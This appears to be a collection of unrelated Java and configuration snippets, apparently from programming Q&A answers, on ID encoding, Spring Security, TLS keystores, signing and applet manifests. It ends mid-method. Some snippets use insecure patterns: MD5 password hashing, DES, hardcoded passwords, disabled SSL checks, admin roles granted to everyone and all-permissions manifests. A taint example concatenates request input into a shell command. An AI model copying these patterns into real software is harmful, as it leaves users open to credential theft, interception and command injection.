        when START_0 .. START_0+10 then (num - START_0) + 52
        end
        out
    end
    begin
        while(line = DATA.readline()) do
                line.chomp!()
                c = compress(line)
                a = add_random(c)
                output = to_output(a)
                input = from_output(output)
                new_c, r = remove_random(input)
                u = uncompress(new_c)
                printf("original input: %s\n compressed: %d\n after adding random amount: %d\n *output: %s\n *input: %s\n random amount added: %d\n after removing random amount: %d\nuncompressed: %s\n", line, c, a, output, input, r, new_c, u)
        end
    rescue EOFError => e
    end
    __END__
    AAA0000
    SIN1500
    ABD2123
    SMS3345
    ZZZ9999
---UNIQUEIDFORSNIP---|172858324|    $ ./compress.rb
    original input: AAA0000
     compressed: 0
     after adding random amount: 508360097408221184
     *output: liSQkzXL1G
     *input: 508360097408221184
     random amount added: 508360097408221184
     after removing random amount: 0
    uncompressed: AAA0000
    original input: SIN1500
     compressed: 123891500
     after adding random amount: 421470683267231532
     *output: fIVFtX9at2
     *input: 421470683267231532
     random amount added: 421470683143340032
     after removing random amount: 123891500
    uncompressed: SIN1500
    original input: ABD2123
     compressed: 292123
     after adding random amount: 414507907112269083
     *output: emb6JfDhUH
     *input: 414507907112269083
     random amount added: 414507907111976960
     after removing random amount: 292123
    uncompressed: ABD2123
    original input: SMS3345
     compressed: 124983345
     after adding random amount: 383242064398325809
     *output: cTPpccLAvn
     *input: 383242064398325809
     random amount added: 383242064273342464
     after removing random amount: 124983345
    uncompressed: SMS3345
    original input: ZZZ9999
     compressed: 175759999
     after adding random amount: 27149937199932031
     *output: CAVf14tiRh
     *input: 27149937199932031
     random amount added: 27149937024172032
     after removing random amount: 175759999
    uncompressed: ZZZ9999
---UNIQUEIDFORSNIP---|172858328|    --- Compress.java.orig	2011-03-25 16:57:47.000000000 -0700
    +++ Compress.java	2011-03-25 17:09:42.000000000 -0700
    @@ -1,12 +1,12 @@
    -import java.util.*
    +import java.util.*;
     
     public class Compress {
     
     static char START_A = "A".charAt(0);
     static char START_a = "a".charAt(0);
     static char START_0 = "0".charAt(0);
    -static int CODEMASK = ((1 << 28) - 1); //turn on lower 28 bits
    -static int RANDOMMASK = ((1 << 60) - 1) & ~ CODEMASK; //turn on upper 32 bits
    +static long CODEMASK = ((1 << 28) - 1); //turn on lower 28 bits
    +static long RANDOMMASK = ((1L << 60) - 1) & ~ CODEMASK; //turn on upper 32 bits
     
     public static void main(String[] args) {
     
    @@ -42,10 +42,10 @@
         char a = line.charAt(0);
         char b = line.charAt(1);
         char c = line.charAt(2);
    -    char h = line.charAt(3);
    -    char i = line.charAt(4);
    -    char j = line.charAt(5);
    -    char k = line.charAt(6);
    +    int h = line.charAt(3) - START_0;
    +    int i = line.charAt(4) - START_0;
    +    int j = line.charAt(5) - START_0;
    +    int k = line.charAt(6) - START_0;
     
         long small_a = (long) a - START_A;
         long small_b = (long) b - START_A;
---UNIQUEIDFORSNIP---|172858333|    import java.util.*;
    
    public class Compress {
    
    static char START_A = "A".charAt(0);
    static char START_a = "a".charAt(0);
    static char START_0 = "0".charAt(0);
    static long CODEMASK = ((1 << 28) - 1); //turn on lower 28 bits
    static long RANDOMMASK = ((1L << 60) - 1) & ~ CODEMASK; //turn on upper 32 bits
    
    public static void main(String[] args) {
    
        String[] test = new String[]{
                //"AAA0000", "SIN1500", "ABD2123", "SMS3345", "ZZZ9999",
                //"ABD2123", "ABD2123", "ABD2123", "ABD2123", "ABD2123"
                "ABD2123"
                };
    
        for(String t : test){
            long c = compress(t);
            long a = add_random(c);
            String output = to_output(a);
            long input = from_output(output);
    
            String[] new_c_r = remove_random(input);
            String u = uncompress(Long.valueOf(new_c_r[0]));
    
            System.out.println("Original input: " + t);
            System.out.println("    compressed: " + c);
            System.out.println("    after adding random amount: " + a);
            System.out.println("    *output: " + output);
            System.out.println("    *input: " + input);
            System.out.println("    random amount added: " + new_c_r[1]);
            System.out.println("    after removing random amount: " + new_c_r[0]);
            System.out.println("    uncompressed: " + u);
            System.out.println("-----------------------------------------------------------------");
        }
    
    }
    
    public static long compress(String line){ //7 character
        char a = line.charAt(0);
        char b = line.charAt(1);
        char c = line.charAt(2);
        int h = line.charAt(3) - START_0;
        int i = line.charAt(4) - START_0;
        int j = line.charAt(5) - START_0;
        int k = line.charAt(6) - START_0;
    
        long small_a = (long) a - START_A;
        long small_b = (long) b - START_A;
        long small_c = (long) c - START_A;
        long letters = (small_a * 26 * 26) + (small_b * 26) + small_c;
        long numbers = letters * 10000 + h * 1000 + i*100 + j*10 + k;
        return numbers;
    }
    
    public static String uncompress(long number){
        long k = number % 10;
        number /= 10;
        long j = number % 10;
        number /= 10;
        long i = number % 10;
        number /= 10;
        long h = number % 10;
        number /= 10;
        long small_c = number % 26;
        number /= 26;
        long small_b = number % 26;
        number /= 26;
        long small_a = number % 26;
        number /= 26;
    
        if (number != 0) throw new RuntimeException("input wasn't generated with compress()");
    
        long a = small_a + START_A;
        long b = small_b + START_A;
        long c = small_c + START_A;
    
        StringBuffer result = new StringBuffer();
        result.append((char) a).append((char) b).append((char) c).append(h).append(i).append(j).append(k);
    
        return result.toString();
    }
    
    public static long add_random(long number){
        return (((long) (Math.random()* Math.pow(2, 31))) << 28) + number;
    }
    
    public static String[] remove_random(long number){
        return new String[]{String.valueOf(number & CODEMASK), String.valueOf(number & RANDOMMASK)};
    }
    
    public static String to_output(long number){
        List<Character> a = new ArrayList<Character>();
        do{
            a.add(transform_out(number % 62));
            number /= 62;
        }while(number > 0);
    
        Collections.reverse(a);
    
        StringBuffer result = new StringBuffer();
        for(int i=0; i<a.size(); i++){
            Character s = (Character) a.get(i);
            result.append(s);
        }
    
        return result.toString();
    }
    
    public static long from_output(String string){
        long num = 0;
        for(char c : string.toCharArray()){
            num *= 62;
            num += transform_in(c);
        }
        return num;
    }
    
    public static char transform_out(long small){
        long out;
    
        if (small < 0 || small > 61){
            throw new RuntimeException("small should be between 0 and 61, inclusive");
        }
        if(small < 26){
            out = START_A + small;
        }else if(small < 52){
            out = START_a + (small-26);
        }else{
            out = START_0 + (small-52);
        }
        return (char) out;
    }
    
    
    public static long transform_in(char c){
        if(!String.valueOf(c).matches("[a-zA-Z0-9]")){ 
            throw new RuntimeException("char should be A-Z, a-z, or 0-9, inclusive");
        }
        long num = (long) c;
    
        long out;
        if(num >= START_A && num <= START_A+26) out = num-START_A;
        else if(num >= START_a && num <= START_a+26) out = (num-START_a) + 26;
        else if(num >= START_0 && num <= START_0+10) out = (num-START_0) + 52;
        else throw new RuntimeException("Salah, bego!");
    
        return out;
    }}
---UNIQUEIDFORSNIP---|172904372|    Subject subject = Subject.getSubject(AccessController.getContext());
---UNIQUEIDFORSNIP---|172904376|    Subject subject = new Subject();  //Set Principles here
    Subject.doAs(subject, new PrivilegedAction<Void>()
    {
        public Void run()
        {
            Foo.methodThatCaresAboutSubject();
        }
    });
---UNIQUEIDFORSNIP---|173049746|    String password = new String(passwordInputField.getPassword());
    
    MessageDigest md = MessageDigest.getInstance("MD5");
    md.update(password.getBytes());
    String hashedPass = new BigInteger(1, md.digest()).toString(16);
---UNIQUEIDFORSNIP---|173049748|    private byte[] toBytes(char[] chars) {
        CharBuffer charBuffer = CharBuffer.wrap(chars);
        ByteBuffer byteBuffer = Charset.forName("UTF-8").encode(charBuffer);
        byte[] bytes = Arrays.copyOfRange(byteBuffer.array(),
                byteBuffer.position(), byteBuffer.limit());
        Arrays.fill(charBuffer.array(), '\u0000'); // clear sensitive data
        Arrays.fill(byteBuffer.array(), (byte) 0); // clear sensitive data
        return bytes;
    }
    char[] passChars = passwordInputField.getPassword();
    byte[] passBytes = toBytes(passChars);
    MessageDigest md = MessageDigest.getInstance("MD5");
    md.update(passBytes);
    String hashedPass = new BigInteger(1, md.digest()).toString(16);
    Arrays.fill(passChars, '\u0000'); // clear sensitive data
    Arrays.fill(passBytes, (byte) 0); // clear sensitive data
---UNIQUEIDFORSNIP---|173095754|    @Service("customUserDetailsService")
    public class CustomUserDetailsService implements UserDetailsService {
        // your UserRepository for your user
        private final UserRepository userRepository;
    
        @Autowired
        public CustomUserDetailsService(UserRepository userRepository) {
            this.userRepository = userRepository;
        }
    
    
        @Override
        public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
            User user = userRepository.findByUsername(username);
            if (null == user || ! user.getUsername().equals(username)) {
                throw new UsernameNotFoundException("No user present with username: " + username);
            } else {
    
                return new CustomUserDetails(user);
            }
        }
    }
---UNIQUEIDFORSNIP---|173095758|    // You want to extend your User class here
    public class CustomUserDetails extends User implements UserDetails {
        private static final long serialVersionUID = 1L;
        private Users user;
    
        public CustomUserDetails(User user) {
            super(user);
            this.user = user;
        }
    
        @Override
        public Collection<? extends GrantedAuthority> getAuthorities() {
            // You don't talk about UserRoles, so return ADMIN for everybody or implement roles. 
            return AuthorityUtils.commaSeparatedStringToAuthorityList("ROLE_ADMIN");
        }
    
        @Override
        public boolean isAccountNonExpired() {
            return true;
        }
    
        @Override
        public boolean isAccountNonLocked() {
            return true;
        }
    
        @Override
        public boolean isCredentialsNonExpired() {
            return true;
        }
    
        @Override
        public boolean isEnabled() {
            // just for example
            return this.user.getActive() == true;
        }
    
        @Override
        public String getUsername() {
            return this.user.getUsername();
        }
    
        @Override
        public String getPassword() {
            return this.user.getPassword();
        }
    
        // Just an example to put some addititional Data to your logged in user
    
        public String getUserDatabase() {
            return "usertable" + Integer.toString(1 + this.user.getUserId());
        }
    
    
    }
---UNIQUEIDFORSNIP---|173095760|    @Entity
    @Table(name = "users")
    public class User{
        @Id
        @GeneratedValue(strategy = GenerationType.AUTO)
        private int id;
    
        @Column(name = "name")
        private String name;
        @Column(name = "login")
        private String login;
        @Column(name = "password")
        private String password;
        
        public User() {}
        public User(User user) {
            this.id = user.getId();
            this.name = user.getName();
            // … the same for all properties.
        }
    }
---UNIQUEIDFORSNIP---|173095762|    public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
        private final
        UserDetailsService service;
    
        @Autowired
        public WebSecurityConfig(UserDetailsService service) {
            this.service = service;
        }
        @Autowired
        public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        auth.userDetailsService(service).passwordEncoder(passwordEncoder());
        @Bean
        public PasswordEncoder passwordEncoder() {
            return new BCryptPasswordEncoder();
        }
        @Override
        protected void configure(HttpSecurity http) throws Exception {
            //left out because not related here
        }
    }
---UNIQUEIDFORSNIP---|173095764|    CustomUserDetails userDetails = 
        (CustomUserDetails) SecurityContextHolder
            .getContext()
            .getAuthentication()
            .getPrincipal();
    
---UNIQUEIDFORSNIP---|173208914|    putty = App.open("path/to/putty.exe")
    putty.focus()
    password = Env.getClipboard()
    rightClick("putty_window.png")
---UNIQUEIDFORSNIP---|173208916|    // Libraries to set clipboard
    import java.awt.Toolkit;
    import java.awt.datatransfer.StringSelection;
    import java.awt.datatransfer.Clipboard;
    public class tester{
    
     public static void main(String[] args){
    
         // from string to clipboard
        StringSelection selection = new StringSelection("hi");
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        clipboard.setContents(selection, selection);
     }
    }
---UNIQUEIDFORSNIP---|173339349|    /opt/jdk1.7.0_40/bin/keytool -genkey -alias tomcat -keypass mypassword -keystore keystore.key -storepass mypassword -keyalg RSA
---UNIQUEIDFORSNIP---|173339354|		<Connector 
			port="8443" 
			SSLEnabled="true"
			maxThreads="150"  
			scheme="https" 
			secure="true"
			clientAuth="false" 
			sslProtocol="TLS"
			keystoreFile="/path.to.your.keystore/keystore.key"
			keystorePass="mypassword" />    
---UNIQUEIDFORSNIP---|173339358|     /opt/jdk1.7.0_40/bin/keytool -import -file TomcatUser.pem.x509 -keystore ~yourUser/MyLocalKeypass -storepass xyz
---UNIQUEIDFORSNIP---|173339361|    System.setProperty("javax.net.ssl.trustStore","~yourUser/MyLocalKeypass");
    System.setProperty("javax.net.ssl.trustStorePassword","xyz");
---UNIQUEIDFORSNIP---|173349892|    <security-constraint>
      <web-resource-collection>
        <url-pattern>/*</url-pattern>      <!--The url that should be protected -->
      </web-resource-collection>
      <auth-constraint>
        <role-name>admin</role-name>       <!--The required roles for accessing the url -->
        <role-name>user</role-name>
        <role-name>moderator</role-name>
      </auth-constraint>
    </security-constraint>
    <login-config>
      <auth-method>BASIC</auth-method>     <!-- Use http basic authentication -->
      <realm-name>Test Realm</realm-name>  <!-- Users are defined in this realm -->
    </login-config>
---UNIQUEIDFORSNIP---|173361997|    openssl pkcs8 -topk8 -inform PEM -outform DER -passin pass:passphrase -in "C:\Input\CERT.pem" -out "C:\Input\CERT.der"-nocrypt
---UNIQUEIDFORSNIP---|173362000|    import java.io.*;
    import java.security.*;
    import java.security.spec.*;
    
    import com.sun.org.apache.xml.internal.security.utils.Base64;
    
    class MainClass{
    	public static void main(String args[]){
    		try {
    			MessageDigest cript = MessageDigest.getInstance("SHA-1");
    			cript.reset();
                  		cript.update(args[0].getBytes("UTF-8"));
                  		byte[] b_digest = cript.digest();
    
    			Signature sign = Signature.getInstance("SHA1withRSA");
    			PrivateKey pk = get("C:/Input/CERT.der");
    			sign.initSign(pk);
    			sign.update(b_digest);
    			byte[] b1 = sign.sign();
    			
    			String signedString = new String(b1);
    			String s2 = new String(Base64.encode(b1));
    
    			System.out.println("_______________PrivateKey_________________________");
    			System.out.println(pk.toString() +"|");
    			System.out.println("_______________Digest_________________________");
    			String temp = new String(b_digest);
    			System.out.println(temp + "|");
    			System.out.println("_______________Signature_________________________");
    			System.out.println(signedString +"|");
    			System.out.println("_______________Encoded_________________________");
    			System.out.println(s2 +"|");
    
    			}
    		catch (Exception ex) {
    			System.out.println(ex.getMessage());
    			ex.printStackTrace();
    			}
    		}
    
    	public static PrivateKey get(String filename) throws Exception {
    		File f = new File(filename);
    		FileInputStream fis = new FileInputStream(f);
    		DataInputStream dis = new DataInputStream(fis);
    		byte[] keyBytes = new byte[(int)f.length()];
    		dis.readFully(keyBytes);
    		dis.close();
    
    		PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(keyBytes);
    		KeyFactory kf = KeyFactory.getInstance("RSA");
    		return kf.generatePrivate(spec);
    	}
    }
---UNIQUEIDFORSNIP---|173374398|    CREATE VIEW vUsers AS  
    SELECT userid, password from Users where userid IS NOT NULL  
    UNION ALL  
    SELECT email, password from Users where email IS NOT NULL 
  
---UNIQUEIDFORSNIP---|173461280|    <error-page>
        <!-- Forbidden directory listing -->
        <error-code>403</error-code>
        <location>/general-error.html</location>
    </error-page>
---UNIQUEIDFORSNIP---|173577816|    webClient.setUseInsecureSSL(true);
---UNIQUEIDFORSNIP---|173577818|    webClient.getOptions().setUseInsecureSSL(true);
---UNIQUEIDFORSNIP---|173628170|     String name = request.getBody(); // tainted
     String cmd = "grep " + name + " customers.txt"; // also tainted
     String cleanName = sanitize(name); // untainted
     String cleanerName = validNameMap.get(name); // untainted
     String literal = "a literal string"; // untainted
---UNIQUEIDFORSNIP---|173628172|     String command = "/usr/local/bin/myProgram";
     String path = "/tmp/inputfile";
     createNewFile(path, request.getBody());
     runtime.exec(command, path);
     
---UNIQUEIDFORSNIP---|173669973|    net.sourceforge.jnlp.LaunchException: Fatal: Initialization Error: Could not initialize applet.
            at net.sourceforge.jnlp.Launcher.createApplet(Launcher.java:604)
            at net.sourceforge.jnlp.Launcher.getApplet(Launcher.java:548)
            at net.sourceforge.jnlp.Launcher$TgThread.run(Launcher.java:729)
    Caused by: net.sourceforge.jnlp.LaunchException: Fatal: Launch Error: Jars not verified.
            at net.sourceforge.jnlp.runtime.JNLPClassLoader.checkTrustWithUser(JNLPClassLoader.java:467)
            at net.sourceforge.jnlp.runtime.JNLPClassLoader.initializeResources(JNLPClassLoader.java:410)
            at net.sourceforge.jnlp.runtime.JNLPClassLoader.<init>(JNLPClassLoader.java:168)
            at net.sourceforge.jnlp.runtime.JNLPClassLoader.getInstance(JNLPClassLoader.java:249)
            at net.sourceforge.jnlp.Launcher.createApplet(Launcher.java:575)
            ... 2 more
    Caused by: 
    net.sourceforge.jnlp.LaunchException: Fatal: Launch Error: Jars not verified.
            at net.sourceforge.jnlp.runtime.JNLPClassLoader.checkTrustWithUser(JNLPClassLoader.java:467)
            at net.sourceforge.jnlp.runtime.JNLPClassLoader.initializeResources(JNLPClassLoader.java:410)
            at net.sourceforge.jnlp.runtime.JNLPClassLoader.<init>(JNLPClassLoader.java:168)
            at net.sourceforge.jnlp.runtime.JNLPClassLoader.getInstance(JNLPClassLoader.java:249)
            at net.sourceforge.jnlp.Launcher.createApplet(Launcher.java:575)
            at net.sourceforge.jnlp.Launcher.getApplet(Launcher.java:548)
            at net.sourceforge.jnlp.Launcher$TgThread.run(Launcher.java:729)
    java.lang.NullPointerException
            at net.sourceforge.jnlp.NetxPanel.runLoader(NetxPanel.java:99)
            at sun.applet.AppletPanel.run(AppletPanel.java:380)
            at java.lang.Thread.run(Thread.java:636)
    java.lang.NullPointerException
            at sun.applet.AppletPanel.run(AppletPanel.java:430)
            at java.lang.Thread.run(Thread.java:636)
    java.lang.Exception: Applet initialization timeout
            at sun.applet.PluginAppletViewer.handleMessage(PluginAppletViewer.java:637)
            at sun.applet.PluginStreamHandler.handleMessage(PluginStreamHandler.java:270)
            at sun.applet.PluginMessageHandlerWorker.run(PluginMessageHandlerWorker.java:82)
    java.lang.RuntimeException: Failed to handle message: handle 60822154 for instance 2
            at sun.applet.PluginAppletViewer.handleMessage(PluginAppletViewer.java:660)
            at sun.applet.PluginStreamHandler.handleMessage(PluginStreamHandler.java:270)
            at sun.applet.PluginMessageHandlerWorker.run(PluginMessageHandlerWorker.java:82)
    Caused by: java.lang.Exception: Applet initialization timeout
            at sun.applet.PluginAppletViewer.handleMessage(PluginAppletViewer.java:637)
            ... 2 more
---UNIQUEIDFORSNIP---|173669976|    package org.pscode.eg.docload;
    
    import java.awt.FlowLayout;
    import javax.swing.*;
    
    public class Example extends JApplet {
    
    
        JLabel label;
    
        public void init()
        {
            System.out.println("init()");
            SwingUtilities.invokeLater(new Runnable(){public void run() {
                label = new JLabel("inited.");
                getContentPane().setLayout(new FlowLayout());
                getContentPane().add(label);
            }});
        }
        
        @Override
        public void start() {
            System.out.println("start()");
            label.setText("started.");
        }
    
        @Override
        public void stop() {
            System.out.println("stop()");
            label.setText("stopped.");
        }
    
        @Override
        public void destroy() {
            System.out.println("destroy()");
            label.setText("destroyed.");
        }
    }
---UNIQUEIDFORSNIP---|173762349|		SecretKey key = KeyGenerator.getInstance("DES").generateKey();
		byte[] data = key.getEncoded();
		SecretKey key2 = new SecretKeySpec(data, 0, data.length, "DES");
---UNIQUEIDFORSNIP---|173791292|    final TelephonyManager tm = (TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
    final String tmDevice, tmSerial, androidId;
    tmDevice = "" + tm.getDeviceId();
    tmSerial = "" + tm.getSimSerialNumber();
    androidId = "" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
    
    UUID deviceUuid = new UUID(androidId.hashCode(), ((long)tmDevice.hashCode() << 32) | tmSerial.hashCode());
    String deviceId = deviceUuid.toString();
---UNIQUEIDFORSNIP---|173921759|    new String(encriptedSMS,"UTF-8")
---UNIQUEIDFORSNIP---|173921763|    String encodedSMS = Base64.encodeToString(encriptedSMS, Base64.DEFAULT)
---UNIQUEIDFORSNIP---|173921767|    byte[] encriptedSMS = Base64.decode(encodedSMS, Base64.DEFAULT)
---UNIQUEIDFORSNIP---|173951748|    String FROM_CHAR2=new String(new char[]{102,114,111,109,95,99,104,97,114,115,95,50});
---UNIQUEIDFORSNIP---|173966588|    sudo rm -rf /Library/Internet\ Plug-Ins/JavaAppletPlugin.plugin
---UNIQUEIDFORSNIP---|174143681|    FILE *fp;
    fp = fopen("/proc/self/maps", "r");
---UNIQUEIDFORSNIP---|174143683|    while (fgets(line, 2048, fp) != NULL) {
		// search for '.dex'
		if (strstr(line, ".dex") != NULL) {
            // get starting and ending addresses of the DEX file region
---UNIQUEIDFORSNIP---|174175917|     2830       getCertFingerPrint("MD5", cert),
---UNIQUEIDFORSNIP---|174175922|     3167       /**
     3168        * Gets the requested finger print of the certificate.
     3169        */
     3170       private String getCertFingerPrint(String mdAlg, Certificate cert)
     3171           throws Exception
     3172       {
     3173           byte[] encCertInfo = cert.getEncoded();
     3174           MessageDigest md = MessageDigest.getInstance(mdAlg);
     3175           byte[] digest = md.digest(encCertInfo);
     3176           return toHexString(digest);
     3177       }
---UNIQUEIDFORSNIP---|174249836|    import java.io.File;
    import java.math.BigInteger;
    import java.security.KeyFactory;
    import java.security.PublicKey;
    import java.security.spec.DSAPublicKeySpec;
    import java.security.spec.RSAPublicKeySpec;
    import java.util.Scanner;
    
    import org.apache.commons.codec.binary.Base64;
    
    public class AuthorizedKeysDecoder {
    	private byte[] bytes;
    	private int pos;
    
    	public PublicKey decodePublicKey(String keyLine) throws Exception {
    		bytes = null;
    		pos = 0;
    
    		// look for the Base64 encoded part of the line to decode
    		// both ssh-rsa and ssh-dss begin with "AAAA" due to the length bytes
    		for (String part : keyLine.split(" ")) {
    			if (part.startsWith("AAAA")) {
    				bytes = Base64.decodeBase64(part);
    				break;
    			}
    		}
    		if (bytes == null) {
    			throw new IllegalArgumentException("no Base64 part to decode");
    		}
    
    		String type = decodeType();
    		if (type.equals("ssh-rsa")) {
    			BigInteger e = decodeBigInt();
    			BigInteger m = decodeBigInt();
    			RSAPublicKeySpec spec = new RSAPublicKeySpec(m, e);
    			return KeyFactory.getInstance("RSA").generatePublic(spec);
    		} else if (type.equals("ssh-dss")) {
    			BigInteger p = decodeBigInt();
    			BigInteger q = decodeBigInt();
    			BigInteger g = decodeBigInt();
    			BigInteger y = decodeBigInt();
    			DSAPublicKeySpec spec = new DSAPublicKeySpec(y, p, q, g);
    			return KeyFactory.getInstance("DSA").generatePublic(spec);
    		} else {
    			throw new IllegalArgumentException("unknown type " + type);
    		}
    	}
    
    	private String decodeType() {
    		int len = decodeInt();
    		String type = new String(bytes, pos, len);
    		pos += len;
    		return type;
    	}
    
    	private int decodeInt() {
    		return ((bytes[pos++] & 0xFF) << 24) | ((bytes[pos++] & 0xFF) << 16)
    				| ((bytes[pos++] & 0xFF) << 8) | (bytes[pos++] & 0xFF);
    	}
    
    	private BigInteger decodeBigInt() {
    		int len = decodeInt();
    		byte[] bigIntBytes = new byte[len];
    		System.arraycopy(bytes, pos, bigIntBytes, 0, len);
    		pos += len;
    		return new BigInteger(bigIntBytes);
    	}
    
    	public static void main(String[] args) throws Exception {
    		AuthorizedKeysDecoder decoder = new AuthorizedKeysDecoder();
    		File file = new File("authorized_keys");
    		Scanner scanner = new Scanner(file).useDelimiter("\n");
    		while (scanner.hasNext()) {
    			System.out.println(decoder.decodePublicKey(scanner.next()));
    		}
    		scanner.close();
    	}
    }
---UNIQUEIDFORSNIP---|174333518|     <https-listener name="https" socket-binding="https" security-
      realm="SSLRealm"      
      enabled-protocols="TLSv1.2"     
      enabled-cipher-suites="TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, etc."/>
---UNIQUEIDFORSNIP---|174333520|    <security-realm name="SSLRealm"> 
        <server-identities> 
          <ssl > 
            <keystore
         path="/var/mysite/ssl/mysite.jks"
         keystore-password="******"
         alias="mysite"
         /> 
          </ssl> 
        </server-identities> 
      </security-realm> 
---UNIQUEIDFORSNIP---|174405615|    permission java.lang.RuntimePermission "readFileDescriptor";
    permission java.lang.RuntimePermission "writeFileDescriptor";
---UNIQUEIDFORSNIP---|174490428|	private static final int PBE_ITERATION_COUNT = 10000;
	private static final int AES_KEY_LENGTH_BITS = 128;
	private static final int HMAC_KEY_LENGTH_BITS = 256;
	private static final String PBE_ALGORITHM = "PBKDF2WithHmacSHA1";
	private static final int AES_KEY_LENGTH_BYTES = AES_KEY_LENGTH_BITS >> 3;
	private static final int HMAC_KEY_LENGTH_BYTES = HMAC_KEY_LENGTH_BITS >> 3;
	private static final String CIPHER = "AES";
	private static final String HMAC_ALGORITHM = "HMACSHA256";
	private static final int MASTER_KEY_LENGTH_BITS = 160; // max for PBKDF2 configured with SHA-1
	public static AesHmacKeyPair generateKeyFromPassword(String password, byte[] salt) throws GeneralSecurityException {
	    // PrngFixes.fixPrng(); <-- needs to be put back
	    //Get enough random bytes for just the master key:
	    KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt,
	            PBE_ITERATION_COUNT, MASTER_KEY_LENGTH_BITS);
	    SecretKeyFactory keyFactory = SecretKeyFactory
	            .getInstance(PBE_ALGORITHM);
	    byte[] masterKeyBytes = keyFactory.generateSecret(keySpec).getEncoded();
	    //Generate the AES key
	    byte[] confidentialityKeyBytes = kdf(masterKeyBytes, "ENC", AES_KEY_LENGTH_BYTES);
	    SecretKey confidentialityKey = new SecretKeySpec(confidentialityKeyBytes, CIPHER);
	    //Generate the HMAC key
	    byte[] integrityKeyBytes = kdf(masterKeyBytes, "MAC", HMAC_KEY_LENGTH_BYTES);
	    SecretKey integrityKey = new SecretKeySpec(integrityKeyBytes, HMAC_ALGORITHM);
	    
	    return new AesHmacKeyPair(confidentialityKey, integrityKey);
	}
	private static byte[] kdf(byte[] inputKeyMaterial, String label, int outputKeyBytes) {
		try {
			Mac mac = Mac.getInstance("HMACSHA256");
		    mac.init(new SecretKeySpec(inputKeyMaterial, "HMACSHA256"));
		    mac.update(label.getBytes(StandardCharsets.US_ASCII));
		    byte[] confidentialityKeyBytes = mac.doFinal();
			return Arrays.copyOf(confidentialityKeyBytes, outputKeyBytes);
		} catch (NoSuchAlgorithmException | InvalidKeyException e) {
			throw new RuntimeException("HMAC operation doesn't work", e);
		}
	}
---UNIQUEIDFORSNIP---|174630886|    Missing required Permissions manifest attribute in main jar: 
       https://ibank.ukrsotsbank.com/client2019UA.jar
---UNIQUEIDFORSNIP---|174630888|    Manifest-Version: 1.0
    Ant-Version: Apache Ant 1.7.0
    Created-By: 16.3-b01 (Sun Microsystems Inc.)
    
    Name: com/bifit/security/core/l.class
    SHA1-Digest: d2WlbgJlgMWvzj4b5EjxPrd1IlA=
    
    Name: com/bifit/util/VerbalNumber_ua.class
    SHA1-Digest: YZt7ca1OqSFbsVlrjH9+4acukFg=
    
    ...
    
    Name: com/bifit/security/token/CrystalNativeLoader$F2.class
    SHA1-Digest: Fgczu0EVPvoSv5QKOqDSgIawfC0=
---UNIQUEIDFORSNIP---|174630890|    Manifest-Version: 1.0
    Implementation-Title: MyApplet
    Implementation-Version: applet build
    Application-Name: Slide Show
    Caller-Allowable-Codebase: *
    Trusted-Library: true
    Application-Library-Allowable-Codebase: *
    Trusted-Only: true
    Permissions: all-permissions  // <- ensure this bit is in the manifest!
    Name: com/bifit/security/core/l.class
    SHA1-Digest: d2WlbgJlgMWvzj4b5EjxPrd1IlA=
    
    Name: com/bifit/util/VerbalNumber_ua.class
    SHA1-Digest: YZt7ca1OqSFbsVlrjH9+4acukFg=
    
    ...
    
    Name: com/bifit/security/token/CrystalNativeLoader$F2.class
    SHA1-Digest: Fgczu0EVPvoSv5QKOqDSgIawfC0=
---UNIQUEIDFORSNIP---|174666019|    import java.security.SecureRandom;
    import java.math.BigInteger;
    
    public final class PasswordGenerator {
        private SecureRandom random = new SecureRandom();
    
        public String nextPassword() {
            return new BigInteger(130, random).toString(32);
        }
    }
---UNIQUEIDFORSNIP---|174769649|       /**
         * Constructs an HTTP server on given hostname andport.
         */
        public NanoHTTPD(String hostname, int port) {
            this.hostname = hostname;
            this.myPort = port;
            setTempFileManagerFactory(new DefaultTempFileManagerFactory());
            setAsyncRunner(new DefaultAsyncRunner());
        }
    
        /**
         * Start the server.
         * @throws IOException if the socket is in use.
         */
        public void start() throws IOException {
            myServerSocket = new ServerSocket();
            myServerSocket.bind((hostname != null) ? new InetSocketAddress(hostname, myPort) : new InetSocketAddress(myPort));
---UNIQUEIDFORSNIP---|174822592|    @Provider
    /**
     * AccessDeniedMapper is instantiated by Jersey directly through the "jersey.config.server.provider.packages" setting
     */
    public class AccessDeniedMapper implements ExceptionMapper<AccessDeniedException> {
        @Override
        public Response toResponse(AccessDeniedException e) {
            return Response.status(401)
                    .build();
        }
    }
---UNIQUEIDFORSNIP---|174822594|    <!-- Map the REST Servlet to /rest/ -->
    <servlet>
        <servlet-name>RestService</servlet-name>
        <servlet-class>org.glassfish.jersey.servlet.ServletContainer</servlet-class>
        <init-param>
            <!--Every class inside of this package (com.unsubcentral.rest) will be available to Jersey-->
            <param-name>jersey.config.server.provider.packages</param-name>
            <param-value>com.rince.rest</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>RestService</servlet-name>
        <url-pattern>/rest/*</url-pattern>
    </servlet-mapping>
---UNIQUEIDFORSNIP---|174849314|    <Realm className="org.apache.catalina.realm.UserDatabaseRealm"
                 resourceName="UserDatabase"/>
 
---UNIQUEIDFORSNIP---|174849318|    <Realm className="org.apache.catalina.realm.LockOutRealm">
                   <Realm className="org.apache.catalina.realm.UserDatabaseRealm"
                   resourceName="UserDatabase"/>
      </Realm> 
---UNIQUEIDFORSNIP---|174853169|    import java.util.HashMap;
    import java.util.Map.Entry;
    public class Encrypt {
	/**
	 * @param args
	 */
	static HashMap<String, String> hm = new HashMap();
	
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		hm.put("a", "b");	
		hm.put("b", "c");	
		hm.put("c", "d");	
		hm.put("d", "e");	
		hm.put("e", "f");	
		hm.put("f", "g");
		hm.put("g", "h");	
		hm.put("h", "i");	
		hm.put("i", "j");	
		hm.put("j", "k");	
		hm.put("k", "l");	
		hm.put("l", "m");
		hm.put("m", "n");	
		hm.put("1", "4");	
		hm.put("2", "3");	
		hm.put("3", "2");	
		hm.put("4", "1");	
		hm.put("5", "0");
		
		String input = "this is a simple text";
		String text = encode(input);
